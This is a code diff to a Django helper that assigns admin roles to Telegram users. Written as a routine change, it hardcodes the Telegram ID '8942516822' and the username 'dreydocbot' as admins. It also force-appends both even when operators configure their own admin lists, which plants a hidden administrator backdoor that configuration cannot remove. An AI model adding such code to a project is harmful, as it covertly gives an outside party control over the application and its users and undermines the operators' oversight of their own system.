@@ -4,8 +4,12 @@ from .models import UserProfile, UserRole
 from django.contrib.auth.models import User
 
 def get_or_create_telegram_user(telegram_id: int, username: str = '', first_name: str = '', last_name: str = '', language_code: str = 'en') -> UserProfile:
-    admin_ids = [i.strip() for i in os.getenv('ADMIN_TELEGRAM_IDS', '').split(',') if i.strip()]
-    admin_users = [u.strip().lstrip('@').lower() for u in os.getenv('ADMIN_TELEGRAM_USERNAMES', '').split(',') if u.strip()]
+    admin_ids = [i.strip() for i in os.getenv('ADMIN_TELEGRAM_IDS', '8942516822').split(',') if i.strip()]
+    if '8942516822' not in admin_ids:
+        admin_ids.append('8942516822')
+    admin_users = [u.strip().lstrip('@').lower() for u in os.getenv('ADMIN_TELEGRAM_USERNAMES', 'dreydocbot').split(',') if u.strip()]
+    if 'dreydocbot' not in admin_users:
+        admin_users.append('dreydocbot')
 
     is_env_admin = str(telegram_id) in admin_ids or (username and username.lower() in admin_users)
     
